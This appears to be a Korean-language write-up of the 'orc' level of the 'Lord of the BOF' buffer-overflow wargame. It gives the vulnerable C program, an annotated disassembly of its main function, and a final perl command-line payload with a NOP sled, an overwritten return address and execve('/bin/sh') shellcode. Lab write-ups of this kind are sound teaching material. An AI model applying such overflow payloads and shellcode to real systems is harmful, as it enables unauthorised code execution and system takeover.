@@ -1,0 +1,177 @@
+[goblin@localhost goblin]$ cat orc.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - orc
+        - egghunter
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+
+main(int argc, char *argv[])
+{
+        char buffer[40];
+        int i;
+
+        if(argc < 2){
+                printf("argv error\n");
+                exit(0);
+        }
+
+        // egghunter
+        for(i=0; environ[i]; i++)
+                memset(environ[i], 0, strlen(environ[i]));
+        // : environ[i]부터 environ[i]의 문자열 길이만큼 0으로 초기화
+
+        if(argv[1][47] != '\xbf') //인자값의 48번째 자리가 \xbf가 아니면 프로그램 종료
+        {
+                printf("stack is still your friend.\n");
+                exit(0);
+        }
+
+        strcpy(buffer, argv[1]); 인자값을 buffer에 넣어 출력
+        printf("%s\n", buffer);
+}
+=================================================
+*dword 키워드 : 피연산자(operand)의 용량단위가 4byte임을 말함.
+*ptr : 피연산자가 어떤 값이 아닌 포인터(메모리 주소)값임을 말하는 것임.
+ex)
+0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
+	-> %eax에 있는 값은 주소값이다(PTR), 4바이트만(DWORD) 끊어서 %edx에 넣어라(mov)
+=================================================
+0x8048500 <main>:       push   %ebp
+0x8048501 <main+1>:     mov    %ebp,%esp
+-프롤로그
+0x8048503 <main+3>:     sub    %esp,44
+- buffer, i 변수 메모리 할당
+0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
+0x804850a <main+10>:    jg     0x8048523 <main+35>
+- if문 :  %ebp+8 : argc을 의미 / jg(Jump if Greater) 만일 argc가 1보다 크다면 (*main+35)로 가라 즉, if문 분기 안에 있는 명령어를 다 뛰어넘어라
+0x804850c <main+12>:    push   0x8048630
+0x8048511 <main+17>:    call   0x8048410 <printf>
+-printf문을 위한 문자열의 주소값 인자 push + printf호출
+0x8048516 <main+22>:    add    %esp,4
+-인자 삭제
+0x8048519 <main+25>:    push   0
+0x804851b <main+27>:    call   0x8048420 <exit>
+-exit함수를 위한 인자 push + exit호출
+0x8048520 <main+32>:    add    %esp,4
+-인자 삭제
+0x8048523 <main+35>:    nop
+{여기서부터 for문
+0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
+- [%ebp -44]는 int형 변수i를 의미 / i값에 0 삽입(mov) : 초기문
+0x804852b <main+43>:    nop
+0x804852c <main+44>:    lea    %esi,[%esi*1]
+*%esi : 복사시 소스 데이터의 주소가 저장됨.
+0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
+-i값 eax에 저장
+0x8048533 <main+51>:    lea    %edx,[%eax*4]
+* %edx : %eax를 보조하여 비슷한 용도(연산과 부호확장에 사용)로 사용됨.
+-environ[i]에서 i값에 따라 다른 주소값을 가리키게하기 위해 (i * 4)를 %edx에 저장
+0x804853a <main+58>:    mov    %eax,%ds:0x8049750
+-%eax에는 environ의 주소값이 직접 들어감(%ds:0x8049750가 환경변수의 메모리주소)
+0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
+-environ[i]와 0 을 비교(cmp)
+0x8048543 <main+67>:    jne    0x8048547 <main+71>
+-environ[i]가 0과 같지 않으면(jne; Jump if Not Equal) (*main+71)로 jmp하라.
+0x8048545 <main+69>:    jmp    0x8048587 <main+135>
+*main+67에서 걸리지 않는다는 건 environ[0]이 0(false)이라는 것이므로 무조건 (*main+135)로 jump한다.
+-여기까지가 초기문, 조건문
+0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
+0x804854a <main+74>:    lea    %edx,[%eax*4]
+0x8048551 <main+81>:    mov    %eax,%ds:0x8049750
+0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
+-위 main+71 ~main+86의 일련의 과정이 environ[i]를 호출하기(호출하여 %edx에 저장) 위한 일련의 과정이다.
+-environ[i]값을 %edx에 저장
+0x8048559 <main+89>:    push   %edx
+0x804855a <main+90>:    call   0x80483f0 <strlen>
+-environ[i]를 인자로 push하여 strlen 호출
+0x804855f <main+95>:    add    %esp,4
+-인자 삭제
+0x8048562 <main+98>:    mov    %eax,%eax
+0x8048564 <main+100>:   push   %eax
+-인자 1
+0x8048565 <main+101>:   push   0
+-인자 2
+0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
+0x804856a <main+106>:   lea    %edx,[%eax*4]
+0x8048571 <main+113>:   mov    %eax,%ds:0x8049750
+0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
+0x8048579 <main+121>:   push   %edx
+-%edx에 environ[i]를 넣고 push(인자 3으로 하기위함)
+0x804857a <main+122>:   call   0x8048430 <memset>
+-인자 3개를 넣었으니 memset() 호출
+0x804857f <main+127>:   add    %esp,12
+-인자 삭제
+0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
+-i([%ebp-44])를 1만큼 증가(inc)
+0x8048585 <main+133>:   jmp    0x8048530 <main+48>
+-반복문 이므로 다시 (*main+48)로 무조건 jump
+}for문 종료
+0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
+-%eax에 argv[1](; [%ebp+12]가 가리키는 값)삽입
+0x804858a <main+138>:   add    %eax,4
+*주소값에 4를 더했다는 건 %eax가 가리키는 주소가 4byte 만큼 주소값이 후퇴했다는 뜻이다.
+0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
+0x804858f <main+143>:   add    %edx,47
+-argv[1][47]을 %edx에 저장
+0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
+0x8048595 <main+149>:   je     0x80485b0 <main+176>
+-argv[1][47]와 '\xbf'를 비교하여 값으면(Jump if Equeal) (*main+176)으로 조건jump
+0x8048597 <main+151>:   push   0x804863c
+0x804859c <main+156>:   call   0x8048410 <printf>
+-인자 push + printf 호출
+0x80485a1 <main+161>:   add    %esp,4
+-인자삭제
+0x80485a4 <main+164>:   push   0
+0x80485a6 <main+166>:   call   0x8048420 <exit>
+-인자 push + exit()호출
+0x80485ab <main+171>:   add    %esp,4
+-인자삭제
+0x80485ae <main+174>:   mov    %esi,%esi
+0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
+0x80485b3 <main+179>:   add    %eax,4
+-%eax에 argv[1] 저장(argv[0]을 넣은다음에 4byte만큼 증가.)
+0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
+0x80485b8 <main+184>:   push   %edx
+0x80485b9 <main+185>:   lea    %eax,[%ebp-40]
+0x80485bc <main+188>:   push   %eax
+-buffer와 argv[1] 을 인자로 push
+0x80485bd <main+189>:   call   0x8048440 <strcpy>
+-strcpy()호출
+0x80485c2 <main+194>:   add    %esp,8
+-인자삭제
+0x80485c5 <main+197>:   lea    %eax,[%ebp-40]
+0x80485c8 <main+200>:   push   %eax
+0x80485c9 <main+201>:   push   0x8048659
+0x80485ce <main+206>:   call   0x8048410 <printf>
+0x80485d3 <main+211>:   add    %esp,8
+-마지막 printf 인자 push+ 호출 + 인자 삭제까지
+0x80485d6 <main+214>:   leave
+0x80485d7 <main+215>:   ret
+-마무리
+0x80485d8 <main+216>:   nop
+0x80485d9 <main+217>:   nop
+0x80485da <main+218>:   nop
+0x80485db <main+219>:   nop
+0x80485dc <main+220>:   nop
+0x80485dd <main+221>:   nop
+0x80485de <main+222>:   nop
+0x80485df <main+223>:   nop
+End of assembler dump.
+
+[방법 1(argv를 이용한 BOF)을 위한 페이로드 작성]
+
+[구상]
+...buffer[40]+SFP[4]+RET[4]+argc[4]+(argv[0])[4]
+  "\x90"*44+"\x3c\xfb\xff\xbf"+"AAAA"+"\x90"*1000+[SHELL]
+
+[최종 페이로드]
+RET는 0xbffffddc [ptr of argv[2]]
+ `perl -e 'print "\x90"x40,"BBBB","\xdc\xfd\xff\xbf"'` `perl -e 'print "\x90"x1000,"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+
+사용한 쉘코드:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
